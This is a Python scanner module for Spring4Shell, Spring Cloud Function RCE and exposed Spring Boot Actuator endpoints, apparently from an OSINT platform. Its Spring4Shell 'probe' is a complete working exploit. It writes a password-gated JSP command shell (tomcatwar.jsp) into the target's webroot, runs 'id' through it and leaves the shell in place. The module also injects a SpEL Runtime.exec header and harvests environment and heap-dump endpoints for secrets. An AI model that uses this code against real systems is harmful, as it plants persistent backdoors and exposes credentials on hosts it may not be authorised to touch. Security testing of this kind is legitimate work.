"""Spring4Shell — CVE-2022-22965 and Spring Boot actuator exposure scanner.

Spring4Shell allows unauthenticated RCE in Spring Framework via ClassLoader
manipulation. Also detects Spring Boot Actuator endpoints exposing internal
metrics, environment variables, heap dumps, and trace logs.

CVEs covered: CVE-2022-22965 (Spring4Shell), CVE-2022-22963 (Spring Cloud RCE),
CVE-2021-22965 (Spring Data), plus actuator information disclosure.
"""

from __future__ import annotations

import asyncio
import re
from typing import Any
from urllib.parse import urlparse

import httpx
import structlog

from src.adapters.scanners.base import BaseOsintScanner
from src.core.domain.entities.types import ScanInputType

log = structlog.get_logger()

# Spring4Shell RCE payload indicators in headers
_SPRING4SHELL_HEADERS: dict[str, str] = {
    "suffix": "%>//",
    "c1": "Runtime",
    "c2": "<%",
    "DNT": "1",
    "Content-Type": "application/x-www-form-urlencoded",
}

# Spring4Shell CVE-2022-22965 probe data
_SPRING4SHELL_BODY = (
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
    "%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B "
    "java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request."
    "getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20"
    "byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!"
    "%3D-1)%7B%20out.println(new%20String(b%2C0%2Ca))%3B%20%7D%20%7D%25%7Bsuffix%7Di"
    "&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    "&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
    "&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar"
    "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
)

# Spring Cloud RCE CVE-2022-22963 payload
_SPRING_CLOUD_HEADERS: dict[str, str] = {
    "spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec('id')",
}

# Spring Boot Actuator paths
_ACTUATOR_PATHS: list[tuple[str, str]] = [
    ("/actuator", "actuator_root"),
    ("/actuator/env", "env_vars"),
    ("/actuator/health", "health"),
    ("/actuator/info", "info"),
    ("/actuator/metrics", "metrics"),
    ("/actuator/httptrace", "http_trace"),
    ("/actuator/trace", "trace"),
    ("/actuator/dump", "thread_dump"),
    ("/actuator/heapdump", "heap_dump"),
    ("/actuator/shutdown", "shutdown"),
    ("/actuator/beans", "beans"),
    ("/actuator/mappings", "request_mappings"),
    ("/actuator/loggers", "loggers"),
    ("/actuator/auditevents", "audit_events"),
    ("/actuator/sessions", "sessions"),
    ("/manage/health", "manage_health"),
    ("/health", "plain_health"),
    ("/info", "plain_info"),
    ("/env", "plain_env"),
    ("/metrics", "plain_metrics"),
    ("/dump", "plain_dump"),
    ("/heapdump", "plain_heapdump"),
]

# Spring indicators
_SPRING_INDICATORS = re.compile(
    r'(?i)(springframework|spring.boot|Whitelabel Error Page|'
    r'org\.springframework|Tomcat|tomcatwar\.jsp)',
)

# Actuator sensitive data patterns
_ACTUATOR_SENSITIVE = re.compile(
    r'(?i)(password|secret|token|api.key|private.key|database\.url|'
    r'datasource\.url|redis\.password|SPRING_DATASOURCE|JWT_SECRET)',
)


class Spring4ShellScanner(BaseOsintScanner):
    """Spring4Shell (CVE-2022-22965) and Spring Boot actuator scanner.

    Tests for Spring Framework RCE via ClassLoader manipulation, Spring Cloud
    Function RCE, and information disclosure via exposed Actuator endpoints.
    """

    scanner_name = "spring4shell"
    supported_input_types = frozenset({ScanInputType.DOMAIN, ScanInputType.URL})
    cache_ttl = 3600
    scan_timeout = 60

    async def _do_scan(self, input_value: str, input_type: ScanInputType) -> dict[str, Any]:
        base_url = _normalise_url(input_value, input_type)
        return await self._manual_scan(base_url, input_value)

    async def _manual_scan(self, base_url: str, input_value: str) -> dict[str, Any]:
        vulnerabilities: list[dict[str, Any]] = []
        identifiers: list[str] = []
        spring_detected = False
        actuator_findings: list[dict[str, Any]] = []

        async with httpx.AsyncClient(
            timeout=8,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (compatible; Spring4ShellScanner/1.0)"},
        ) as client:
            semaphore = asyncio.Semaphore(8)

            # Step 1: Detect Spring Framework
            try:
                resp = await client.get(base_url)
                body = resp.text
                server = resp.headers.get("server", "")
                if _SPRING_INDICATORS.search(body) or "spring" in server.lower():
                    spring_detected = True
                    identifiers.append("info:spring:detected")
            except Exception:
                pass

            # Step 2: Spring Boot Actuator enumeration
            async def check_actuator(path: str, technique: str) -> None:
                async with semaphore:
                    url = base_url.rstrip("/") + path
                    try:
                        resp = await client.get(url)
                        body = resp.text
                        status = resp.status_code

                        if status == 200:
                            spring_detected_local = True
                            ct = resp.headers.get("content-type", "")
                            is_json = "json" in ct or body.strip().startswith("{")

                            finding = {
                                "path": path,
                                "technique": technique,
                                "status": status,
                                "body_size": len(body),
                            }
                            actuator_findings.append(finding)

                            # Critical: sensitive data in env/config
                            if "env" in path or "config" in path:
                                sensitive_match = _ACTUATOR_SENSITIVE.search(body)
                                severity = "critical" if sensitive_match else "high"
                                vulnerabilities.append({
                                    "type": "actuator_env_exposed",
                                    "severity": severity,
                                    "url": url,
                                    "sensitive_field": sensitive_match.group(0) if sensitive_match else None,
                                    "description": "Spring Boot /actuator/env exposes environment variables and config properties",
                                    "remediation": "Set management.endpoints.web.exposure.include=health,info only",
                                })
                                identifiers.append("vuln:spring:actuator_env")

                            elif "heapdump" in path or "dump" in path:
                                vulnerabilities.append({
                                    "type": "actuator_heapdump",
                                    "severity": "critical",
                                    "url": url,
                                    "description": "Spring Boot heap dump endpoint exposed — credentials/secrets extractable from memory",
                                    "remediation": "Disable heapdump endpoint; restrict actuators to internal network",
                                })
                                identifiers.append("vuln:spring:heapdump")

                            elif "shutdown" in path:
                                vulnerabilities.append({
                                    "type": "actuator_shutdown_exposed",
                                    "severity": "critical",
                                    "url": url,
                                    "description": "Spring Boot /actuator/shutdown exposed — attacker can kill the application",
                                })
                                identifiers.append("vuln:spring:shutdown")

                            elif "beans" in path or "mappings" in path:
                                vulnerabilities.append({
                                    "type": "actuator_internals_exposed",
                                    "severity": "medium",
                                    "url": url,
                                    "technique": technique,
                                    "description": f"Spring Boot actuator '{technique}' exposes application internals",
                                })
                                ident = f"vuln:spring:actuator:{technique}"
                                if ident not in identifiers:
                                    identifiers.append(ident)

                            else:
                                # Generic actuator exposure
                                vulnerabilities.append({
                                    "type": "actuator_exposed",
                                    "severity": "medium",
                                    "url": url,
                                    "technique": technique,
                                    "description": f"Spring Boot actuator endpoint '{path}' accessible",
                                })
                                ident = f"vuln:spring:actuator_generic:{technique}"
                                if ident not in identifiers:
                                    identifiers.append(ident)

                    except Exception:
                        pass

            await asyncio.gather(*[check_actuator(p, t) for p, t in _ACTUATOR_PATHS])

            # Step 3: CVE-2022-22965 Spring4Shell probe
            spring_paths = ["/", "/login", "/api", "/upload", "/index"]
            for path in spring_paths[:3]:
                url = base_url.rstrip("/") + path
                try:
                    resp = await client.post(
                        url,
                        content=_SPRING4SHELL_BODY,
                        headers={**_SPRING4SHELL_HEADERS},
                    )
                    body = resp.text
                    # Tomcat shell written = 200 on /tomcatwar.jsp
                    shell_url = base_url.rstrip("/") + "/tomcatwar.jsp"
                    shell_resp = await client.get(shell_url + "?pwd=j&cmd=id")
                    if shell_resp.status_code == 200 and re.search(r"uid=\d+", shell_resp.text):
                        vulnerabilities.append({
                            "type": "spring4shell_rce",
                            "severity": "critical",
                            "url": url,
                            "shell_url": shell_url,
                            "evidence": re.search(r"uid=\d+[^\n]*", shell_resp.text).group(0)[:60] if re.search(r"uid=\d+", shell_resp.text) else "",
                            "cve": "CVE-2022-22965",
                            "description": "Spring4Shell RCE confirmed — JSP shell written to webroot",
                            "remediation": "Update Spring Framework to 5.3.18+ or 5.2.20+; set JDK ≥ 9; patch Tomcat",
                        })
                        identifiers.append("vuln:spring4shell:rce")
                except Exception:
                    pass

            # Step 4: Spring Cloud Function RCE (CVE-2022-22963)
            cloud_paths = ["/functionRouter", "/api/functionRouter", "/spring-cloud-function"]
            for path in cloud_paths:
                url = base_url.rstrip("/") + path
                try:
                    resp = await client.post(
                        url,
                        content="test",
                        headers={**_SPRING_CLOUD_HEADERS, "Content-Type": "text/plain"},
                    )
                    body = resp.text
                    if resp.status_code == 500 and "Runtime" in body:
                        vulnerabilities.append({
                            "type": "spring_cloud_rce",
                            "severity": "critical",
                            "url": url,
                            "cve": "CVE-2022-22963",
                            "description": "Spring Cloud Function RCE via routing expression injection",
                            "remediation": "Update Spring Cloud Function to 3.1.7+ or 3.2.3+",
                        })
                        identifiers.append("vuln:spring:cloud_rce")
                except Exception:
                    pass

        severity_counts: dict[str, int] = {}
        for v in vulnerabilities:
            s = v.get("severity", "info")
            severity_counts[s] = severity_counts.get(s, 0) + 1

        return {
            "input": input_value,
            "scan_mode": "manual_fallback",
            "base_url": base_url,
            "spring_detected": spring_detected or len(actuator_findings) > 0,
            "actuator_endpoints_found": len(actuator_findings),
            "vulnerabilities": vulnerabilities,
            "total_found": len(vulnerabilities),
            "severity_summary": severity_counts,
            "extracted_identifiers": identifiers,
        }

    def _extract_identifiers(self, raw_data: dict[str, Any]) -> list[str]:
        return raw_data.get("extracted_identifiers", [])


def _normalise_url(value: str, input_type: ScanInputType) -> str:
    if input_type == ScanInputType.DOMAIN:
        return f"https://{value}"
    if not value.startswith(("http://", "https://")):
        return f"https://{value}"
    return value
